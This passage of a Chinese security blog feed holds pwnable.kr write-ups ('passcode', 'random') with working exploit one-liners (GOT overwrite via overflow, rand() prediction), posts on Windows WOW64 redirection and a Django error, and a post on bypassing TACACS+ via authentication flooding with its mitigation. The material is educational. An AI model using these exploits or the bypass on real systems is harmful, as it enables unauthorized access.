<h2 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> passcode1;</div><div class="line">    <span class="keyword">int</span> passcode2;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</div><div class="line">    fflush(<span class="built_in">stdin</span>);</div><div class="line"></div><div class="line">    <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</div><div class="line">    <span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</div><div class="line">        system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span>&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</div><div class="line"></div><div class="line">    welcome();</div><div class="line">    login();</div><div class="line"></div><div class="line">    <span class="comment">// something after login...</span></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>题目描述如下：</p>
<blockquote>
<p>Mommy told me to make a passcode based login system.<br>My initial C code was compiled without any error!<br>Well, there was some compiler warning, but who cares about that?</p>
</blockquote>
<p>告诉我们注意下编译时的warning</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">~/pwn/pwnkr/5 » gcc -m32 5.c -o 5</div><div class="line">5.c: In <span class="keyword">function</span> ‘login’:</div><div class="line">5.c:9:5: warning: format ‘%d’ expects argument of <span class="built_in">type</span> ‘int *’, but argument 2 has <span class="built_in">type</span> ‘int’ [-Wformat=]</div><div class="line">     scanf(<span class="string">"%d"</span>, passcode1);</div><div class="line">     ^</div><div class="line">5.c:14:9: warning: format ‘%d’ expects argument of <span class="built_in">type</span> ‘int *’, but argument 2 has <span class="built_in">type</span> ‘int’ [-Wformat=]</div><div class="line">         scanf(<span class="string">"%d"</span>, passcode2);</div></pre></td></tr></table></figure>
<p>很明显的错误，使用scanf输入int类型的时候没有添加取地址符。但是，这只能说是一个bug，并不能说是漏洞。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</div></pre></td></tr></table></figure>
<p>只要能控制passcode1的地址，就可以完成一个任意地址写。注意到login函数前面，有一个welcome函数，使用gdb调一下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">EAX: 0x0 </div><div class="line">EBX: 0xf7<span class="built_in">fc</span>3000 --&gt; 0x1a6da8 </div><div class="line">ECX: 0x0 </div><div class="line">EDX: 0xf7<span class="built_in">fc</span>4898 --&gt; 0x0 </div><div class="line">ESI: 0x0 </div><div class="line">EDI: 0x0 </div><div class="line">EBP: 0xffffd668 --&gt; 0xffffd688 --&gt; 0x0 </div><div class="line">ESP: 0xffffd640 (<span class="string">"IAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">EIP: 0x80485b3 (&lt;login+6&gt;:  mov    DWORD PTR [esp],0x8048770)</div><div class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x80485ad &lt;login&gt;:   push   ebp</div><div class="line">   0x80485ae &lt;login+1&gt;: mov    ebp,esp</div><div class="line">   0x80485b0 &lt;login+3&gt;: sub    esp,0x28</div><div class="line">=&gt; 0x80485b3 &lt;login+6&gt;: mov    DWORD PTR [esp],0x8048770</div><div class="line">   0x80485ba &lt;login+13&gt;:    call   0x8048420 &lt;<span class="built_in">printf</span>@plt&gt;</div><div class="line">   0x80485bf &lt;login+18&gt;:    mov    eax,DWORD PTR [ebp-0x10]</div><div class="line">   0x80485c2 &lt;login+21&gt;:    mov    DWORD PTR [esp+0x4],eax</div><div class="line">   0x80485c6 &lt;login+25&gt;:    mov    DWORD PTR [esp],0x8048783</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xffffd640 (<span class="string">"IAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">0004| 0xffffd644 (<span class="string">"AA4AAJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">0008| 0xffffd648 (<span class="string">"AJAAfAA5AAKAAgAA6AAL"</span>)</div><div class="line">0012| 0xffffd64c (<span class="string">"fAA5AAKAAgAA6AAL"</span>)</div><div class="line">0016| 0xffffd650 (<span class="string">"AAKAAgAA6AAL"</span>)</div><div class="line">0020| 0xffffd654 (<span class="string">"AgAA6AAL"</span>)</div><div class="line">0024| 0xffffd658 (<span class="string">"6AAL"</span>)</div><div class="line">0028| 0xffffd65c --&gt; 0xb7a3f600 </div><div class="line">[------------------------------------------------------------------------------]</div><div class="line">Legend: code, data, rodata, value</div><div class="line"></div><div class="line">Breakpoint 1, login () at 5.c:8</div><div class="line">8       <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</div><div class="line">gdb-peda$ x/wx <span class="variable">$ebp</span>-0x10</div><div class="line">0xffffd658: 0x4c414136</div><div class="line">gdb-peda$ x/20wx <span class="variable">$ebp</span>-0x10</div><div class="line">0xffffd658: 0x4c414136  0xb7a3f600  0x00000000  0x00000000</div><div class="line">0xffffd668: 0xffffd688  0x080486c8  0x080487f0  0xf7ffd000</div><div class="line">0xffffd678: 0x080486eb  0xf7<span class="built_in">fc</span>3000  0x080486e0  0x00000000</div><div class="line">0xffffd688: 0x00000000  0xf7e35ad3  0x00000001  0xffffd724</div><div class="line">0xffffd698: 0xffffd72c  0xf7feacca  0x00000001  0xffffd724</div><div class="line">gdb-peda$ pattern_offset 0x4c414136</div><div class="line">1279344950 found at offset: 96</div></pre></td></tr></table></figure>
<p>可以看出welcome函数输入的第97-100个字节正好覆盖掉passcode1的地址，所以这就是一个任意地址写。但是程序有Canary，不过没关系，因为canary的第一个字节也是0x00。所以，剩下的思路就是GOT覆盖，覆盖printf的GOT表。可以选择用system覆盖，传入<em>/bin/sh</em>反弹一个shell。不过程序中已经有了读取flag的代码，直接用就可以了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">80485ce:   81 7d f4 c9 07 cc 00    cmpl   <span class="variable">$0xcc07c9</span>,-0xc(%ebp)</div><div class="line">80485d5:   75 1a                   jne    80485f1 &lt;login+0x8d&gt;</div><div class="line">80485d7:   c7 04 24 a5 87 04 08    movl   <span class="variable">$0x80487a5</span>,(%esp)</div><div class="line">80485de:   e8 6d fe ff ff          call   8048450 &lt;puts@plt&gt;</div><div class="line">80485e3:   c7 04 24 af 87 04 08    movl   <span class="variable">$0x80487af</span>,(%esp)</div><div class="line">80485ea:   e8 71 fe ff ff          call   8048460 &lt;system@plt&gt;</div><div class="line">80485ef:   c9                      leave  </div><div class="line">80485f0:   c3                      ret    </div><div class="line">80485f1:   c7 04 24 bd 87 04 08    movl   <span class="variable">$0x80487bd</span>,(%esp)</div><div class="line">80485f8:   e8 53 fe ff ff          call   8048450 &lt;puts@plt&gt;</div><div class="line">80485fd:   c7 04 24 00 00 00 00    movl   <span class="variable">$0x0</span>,(%esp)</div><div class="line">8048604:   e8 77 fe ff ff          call   8048480 &lt;<span class="built_in">exit</span>@plt&gt;</div></pre></td></tr></table></figure>
<p>读flag代码的地址为<em>0x80485e3i</em>。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">passcode@ubuntu:~$ python -c <span class="string">"print 'A' * 96 + '\x00\xa0\x04\x08' + '134514147\n'"</span> | ./passcode</div><div class="line">Toddler<span class="string">'s Secure Login System 1.0 beta.</span></div><div class="line">enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</div><div class="line">Sorry mom.. I got confused about scanf usage :(</div><div class="line">enter passcode1 : Now I can safely trust you that you have credential :)</div></pre></td></tr></table></figure>
<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> random;</div><div class="line">        random = rand();        <span class="comment">// random value!</span></div><div class="line"></div><div class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</div><div class="line"></div><div class="line">        <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</div><div class="line">                <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</div><div class="line">                system(<span class="string">"/bin/cat flag"</span>);</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>rand函数是固定种子生成的，不同机器种子不一样。所以这个程序在一台机器上运行每次rand的结果都为固定的一个值。通过调试看这太服务器rand的值是多少。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">(gdb) disass</div><div class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</div><div class="line">   0x00000000004005f4 &lt;+0&gt;: push   %rbp</div><div class="line">   0x00000000004005f5 &lt;+1&gt;: mov    %rsp,%rbp</div><div class="line">=&gt; 0x00000000004005f8 &lt;+4&gt;: sub    <span class="variable">$0x10</span>,%rsp</div><div class="line">   0x00000000004005<span class="built_in">fc</span> &lt;+8&gt;: mov    <span class="variable">$0x0</span>,%eax</div><div class="line">   0x0000000000400601 &lt;+13&gt;:    callq  0x400500 &lt;rand@plt&gt;</div><div class="line">   0x0000000000400606 &lt;+18&gt;:    mov    %eax,-0x4(%rbp) </div><div class="line">End of assembler dump.</div><div class="line">(gdb) b *0x0000000000400606</div><div class="line">Breakpoint 2 at 0x400606</div><div class="line">(gdb) c</div><div class="line">Continuing.</div><div class="line"></div><div class="line">Breakpoint 2, 0x0000000000400606 <span class="keyword">in</span> main ()</div><div class="line">(gdb) <span class="built_in">print</span> <span class="variable">$eax</span></div><div class="line"><span class="variable">$1</span> = 1804289383</div></pre></td></tr></table></figure>
<p>所以rand固定的值为<em>1804289383</em></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">random@ubuntu:~$ python</div><div class="line">Python 2.7.12 (default, Jul  1 2016, 15:12:24) </div><div class="line">[GCC 5.4.0 20160609] on linux2</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt; from pwn import *</div><div class="line">&gt;&gt;&gt; payload = str(1804289383 ^ 0xdeadbeef)</div><div class="line">&gt;&gt;&gt; io = process(<span class="string">"./random"</span>)</div><div class="line">[x] Starting <span class="built_in">local</span> process <span class="string">'./random'</span></div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./random'</span>: Done</div><div class="line">&gt;&gt;&gt; io.sendline(payload)</div><div class="line">&gt;&gt;&gt; io.recv()</div><div class="line">[*] Process <span class="string">'./random'</span> stopped with <span class="built_in">exit</span> code 0</div><div class="line"><span class="string">'Good!\nMommy, I thought libc random is unpredictable...\n'</span></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目录&quot; class=&quot;headerlink&quot; title=&quot;目录&quot;&gt;&lt;/a&gt;目录&lt;/h2&gt;&lt;p&gt;以下是solution的目录&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#fd&quot; title=&quot;fd&quot;&gt;#fd&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#collision&quot; title=&quot;collision&quot;&gt;#collision&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#bof&quot; title=&quot;bof&quot;&gt;#bof&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#flag&quot; title=&quot;flag&quot;&gt;#flag&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#passcode&quot; title=&quot;passcode&quot;&gt;#passcode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#random&quot; title=&quot;random&quot;&gt;#random&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Other&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://weaponx.site/2017/02/14/%E4%B8%80%E4%BA%9Bpwn%E9%A2%98%E7%9B%AE%E7%9A%84%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-pwnable-kr-II/&quot; title=&quot;一些pwn题目的解题思路[pwnable.kr] II&quot;&gt;一些pwn题目的解题思路[pwnable.kr] II&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="pwn" scheme="http://weaponx.site/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Windows x64上的x86重定向</title>
    <link href="http://weaponx.site/2017/02/10/Windows-x64%E4%B8%8A%E7%9A%84x86%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    <id>http://weaponx.site/2017/02/10/Windows-x64上的x86重定向/</id>
    <published>2017-02-10T17:34:00.000Z</published>
    <updated>2017-02-13T10:37:56.149Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-背景"><a href="#0x00-背景" class="headerlink" title="0x00 背景"></a>0x00 背景</h2><p>搬砖过程中遇到一个很奇怪的现象。写了一个程序利用命令<em>regedit</em>来读取注册表的某项值，出现了一个奇怪的现象：在某些电脑上能读到值，在另一些电脑上无法读取。</p>
<a id="more"></a>
<h2 id="0x01-排查过程"><a href="#0x01-排查过程" class="headerlink" title="0x01 排查过程"></a>0x01 排查过程</h2><p>在无法读取的机器上手动查看，注册表确实是有这个值的。百思不得其解，猜测可能是权限的问题。</p>
<ul>
<li>设置了注册表访问权限</li>
<li>程序使用管理员权限运行</li>
</ul>
<p>试了以上两种方法还是不行。</p>
<p>思考是否为进程权限太低？于是使用Processexp看一下进程的权限。当看到进程路径时，看出了一点端倪。<br>在x86的机器上，我们程序调用的<em>regedit</em>的路径是<em>C:\windows\regedit.exe</em>；而在x86_64上，程序调用的<em>regedit</em>的路径是<em>C:\windows\SysWOW64\regedit.exe</em>。</p>
<p>用实例程序分别编译为32bit和64bit演示一下，不同的程序运行的系统命令所在的路径。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    system(<span class="string">"cmd"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://i.imgur.com/XCh0Oxz.png" alt=""></p>
<p>其中SysWOW64(System Windows on Windows64)是windows的一个兼容层，用来在x86_64的机器上运行x86程序。说白了就是在64bit操作系统上运行32bit程序。因为我们的程序是32bit的，所以在32bit程序中调用的系统程序也是32bit的。</p>
<p>正巧程序读取的注册表键值在64bit版的regedit上可以读取，而在32bit版本的regedit上无法读取，这就造成了开头的问题。</p>
<h2 id="0x02-解决方法"><a href="#0x02-解决方法" class="headerlink" title="0x02 解决方法"></a>0x02 解决方法</h2><p>解决方法有两种：</p>
<ul>
<li>将程序编译成64bit的</li>
<li>使用关闭重定向的函数Wow64DisableWow64FsRedirection</li>
</ul>
<p>第一种方法当然简单粗暴，但是在x86的系统上却无法运行，只能寻求第二种方法。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    PVOID OldVal = <span class="literal">NULL</span>;</div><div class="line">    <span class="keyword">if</span> (Wow64DisableWow64FsRedirection(&amp;OldVal))</div><div class="line">    &#123;</div><div class="line">        system(<span class="string">"cmd"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (FALSE == Wow64RevertWow64FsRedirection(OldVal))</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><img src="http://i.imgur.com/M51OdMS.png" alt=""></p>
<p>可以看到启动的cmd已经是64bit的了。</p>
<p>注意，关闭重定向后完成相关操作一定要恢复重定向<del>，一定要恢复重定向，一定要恢复重定向，重要的事情说三遍</del>，若不恢复的话会导致一些dll等调用失败。</p>
<h2 id="0x03-x86-Redirect-in-x86-64"><a href="#0x03-x86-Redirect-in-x86-64" class="headerlink" title="0x03 x86 Redirect in x86_64"></a>0x03 x86 Redirect in x86_64</h2><p>wow64其实相当于64bit系统的一个子系统，用来兼容32bit的程序。32bit程序运行时会收到重定向的影响，这个重定向主要分为：</p>
<ul>
<li>文件重定向</li>
</ul>
<p>当32bit程序运行时，会存在以下的重定向规则。</p>
<table>
<thead>
<tr>
<th style="text-align:center">访问</th>
<th style="text-align:center">重定向</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">%systemroot%/system32</td>
<td style="text-align:center">%systemroot%/SysWOW64</td>
</tr>
</tbody>
</table>
<p>比如，当32bit程序访问calc.exe时，本应访问</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><div class="line">C:<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>alc.exe</div></pre></td></tr></table></figure>
<p>但是由于重定向机制，会被重定向到</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><div class="line">C:<span class="symbol">\w</span>indwos<span class="symbol">\S</span>ysWOW64<span class="symbol">\c</span>alc.exe</div></pre></td></tr></table></figure>
<ul>
<li>注册表重定向</li>
</ul>
<p>不多说，想了解的话看看微软的文章。<br><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa384253(v=vs.85).aspx" target="_blank" rel="external">https://msdn.microsoft.com/en-us/library/windows/desktop/aa384253(v=vs.85).aspx</a></p>
<h2 id="0x04-Refer"><a href="#0x04-Refer" class="headerlink" title="0x04 Refer"></a>0x04 Refer</h2><p><a href="http://blog.csdn.net/magictong/article/details/5892209" target="_blank" rel="external">http://blog.csdn.net/magictong/article/details/5892209</a><br><a href="http://www.cnblogs.com/lhglihuagang/p/3930874.html" target="_blank" rel="external">http://www.cnblogs.com/lhglihuagang/p/3930874.html</a><br><a href="http://www.tuicool.com/articles/Ibui6bZ" target="_blank" rel="external">http://www.tuicool.com/articles/Ibui6bZ</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-背景&quot;&gt;&lt;a href=&quot;#0x00-背景&quot; class=&quot;headerlink&quot; title=&quot;0x00 背景&quot;&gt;&lt;/a&gt;0x00 背景&lt;/h2&gt;&lt;p&gt;搬砖过程中遇到一个很奇怪的现象。写了一个程序利用命令&lt;em&gt;regedit&lt;/em&gt;来读取注册表的某项值，出现了一个奇怪的现象：在某些电脑上能读到值，在另一些电脑上无法读取。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="安全" scheme="http://weaponx.site/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Django运行时报错</title>
    <link href="http://weaponx.site/2017/02/08/Django%E8%BF%90%E8%A1%8C%E6%97%B6%E6%8A%A5%E9%94%99/"/>
    <id>http://weaponx.site/2017/02/08/Django运行时报错/</id>
    <published>2017-02-08T17:05:03.000Z</published>
    <updated>2017-02-08T17:11:41.467Z</updated>
    
    <content type="html"><![CDATA[<p>年前为了偷懒，做了一个自动化的web程序，用Django写的。春节放假回来发现竟然跑不起来了。<br>报如下错误：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><div class="line">TypeError: view must be <span class="keyword">a</span> callable <span class="keyword">or</span> <span class="keyword">a</span> list/tuple <span class="keyword">in</span> <span class="keyword">the</span> <span class="keyword">case</span> <span class="keyword">of</span> <span class="built_in">include</span>()</div></pre></td></tr></table></figure>
<p>顺手搜了一下，原来是手贱给Django升级了，最新版本的不支持原来的urls的写法了。</p>
<a id="more"></a>
<p>在django最新版本1.10的写法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</div><div class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> include</div><div class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</div><div class="line"><span class="keyword">from</span> app.views <span class="keyword">import</span> index</div><div class="line">urlpatterns = [</div><div class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</div><div class="line">    url(<span class="string">r'^index/$'</span>,index),</div><div class="line">]</div></pre></td></tr></table></figure>
<p>在django 1.10以下版本的写法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</div><div class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> include</div><div class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</div><div class="line"></div><div class="line">urlpatterns = [</div><div class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</div><div class="line">    url(<span class="string">r'^index/$'</span>,<span class="string">"app.views.index"</span>),</div><div class="line">]</div></pre></td></tr></table></figure>
<p>改完之后，又报了一个错</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><div class="line">AttributeError: <span class="string">'tuple'</span> <span class="selector-tag">object</span> has no attribute <span class="string">'resolve'</span></div></pre></td></tr></table></figure>
<p>原来是urls里小括号之前的url没写，记录一下。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;年前为了偷懒，做了一个自动化的web程序，用Django写的。春节放假回来发现竟然跑不起来了。&lt;br&gt;报如下错误：&lt;/p&gt;
&lt;figure class=&quot;highlight livecodeserver&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;TypeError: view must be &lt;span class=&quot;keyword&quot;&gt;a&lt;/span&gt; callable &lt;span class=&quot;keyword&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;a&lt;/span&gt; list/tuple &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;include&lt;/span&gt;()&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;顺手搜了一下，原来是手贱给Django升级了，最新版本的不支持原来的urls的写法了。&lt;/p&gt;
    
    </summary>
    
      <category term="技术" scheme="http://weaponx.site/categories/tech/"/>
    
    
      <category term="Django" scheme="http://weaponx.site/tags/Django/"/>
    
  </entry>
  
  <entry>
    <title>一种绕过TACACS+的思路</title>
    <link href="http://weaponx.site/2017/02/08/%E4%B8%80%E7%A7%8D%E7%BB%95%E8%BF%87TACACS-%E7%9A%84%E6%80%9D%E8%B7%AF/"/>
    <id>http://weaponx.site/2017/02/08/一种绕过TACACS-的思路/</id>
    <published>2017-02-08T10:01:36.000Z</published>
    <updated>2017-03-13T02:48:20.571Z</updated>
    
    <content type="html"><![CDATA[<p>最近对一些交换机做口令猜测检查的时候遇到一个奇怪的现象：配置AAA认证的交换机总能扫出一些弱口令，而且每次都不一样还都不能登录，更神奇的是返回的session确实能执行命令。</p>
<a id="more"></a>
<h2 id="0x00-什么是AAA认证"><a href="#0x00-什么是AAA认证" class="headerlink" title="0x00 什么是AAA认证"></a>0x00 什么是AAA认证</h2><p>AAA是指用使用<em>Authentication</em>、<em>Authorization</em>、<em>Accounting</em>三种功能对要管理交换机的用户做控制。<br>Authentication(认证)：对用户的身份进行认证，决定是否允许此用户访问网络设备。Authorization（授权）:针对用户的不同身份，分配不同的权限，限制每个用户的操作Accounting（计费）：对每个用户的操作进行审计和计费</p>
<h2 id="0x01-什么是TACACS"><a href="#0x01-什么是TACACS" class="headerlink" title="0x01 什么是TACACS+"></a>0x01 什么是TACACS+</h2><p>TACACS+（Terminal Access Controller Access Control System，终端访问控制器控制系统协议）是在TACACS协议的基础上进行了功能增强的安全协议。该协议与RADIUS协议的功能类似，采用客户端/服务器模式实现NAS与TACACS+服务器之间的通信。</p>
<h2 id="0x02-TACACS-的用途"><a href="#0x02-TACACS-的用途" class="headerlink" title="0x02 TACACS+的用途"></a>0x02 TACACS+的用途</h2><p>TACACS+协议主要用于PPP和VPDN（Virtual Private Dial-up Network，虚拟私有拨号网络）接入用户及终端用户的AAA。</p>
<h2 id="0x03-排查过程"><a href="#0x03-排查过程" class="headerlink" title="0x03 排查过程"></a>0x03 排查过程</h2><p>说白了，AAA认证是一种集中认证的模式。所有的认证都是在AAA服务器上完成的，交换机只能得到认证结果。猜测可能是AAA认证服务器出问题了，不过不太了解AAA认证服务器。看了同事发的一篇文章(<a href="http://www.vuln.cn/7043" title="绕过 Cisco TACACS+ 的三种攻击方式" target="_blank" rel="external">http://www.vuln.cn/7043</a>)。</p>
<p>然后看了下交换机的配置文件，找AAA认证相关的配置。发现了以下配置。</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><div class="line">aaa authentication login default <span class="keyword">group</span> <span class="title">tacacs</span>+ local line none</div></pre></td></tr></table></figure>
<p>网上搜了一下，这个配置的意思就是AAA认证使用TACACS+完成。当AAA认证<strong>无法认证</strong>时使用local认证，当前面都<strong>无法认证</strong>则不需要认证（注意，不是认证失败，是无法认证。因为认证失败的话会直接返回）即可登录。</p>
<p>现在原因已经比较清晰了，多线程口令猜测导致AAA认证服务器压力过大拒绝服务，然而本机交换机也因处理认证线程过多拒绝服务。导致最终无需认证登录交换机。</p>
<h2 id="0x04-攻击方式"><a href="#0x04-攻击方式" class="headerlink" title="0x04 攻击方式"></a>0x04 攻击方式</h2><p>这种攻击方式也很简单，只需要向服务器发起大量请求认证的线程即可使AAA服务器拒绝服务，导致无需认证登录交换机。</p>
<h2 id="0x05-缓解方法"><a href="#0x05-缓解方法" class="headerlink" title="0x05 缓解方法"></a>0x05 缓解方法</h2><p>要防止这种情况发生只需要改成如下语句即可。</p>
<figure class="highlight crmsh"><table><tr><td class="code"><pre><div class="line">aaa authentication login default <span class="keyword">group</span> <span class="title">tacacs</span>+ local</div></pre></td></tr></table></figure>
<p>意思就是，在AAA认证无法完成的情况下，使用交换机本地认证，而不是不认证直接返回命令行。</p>
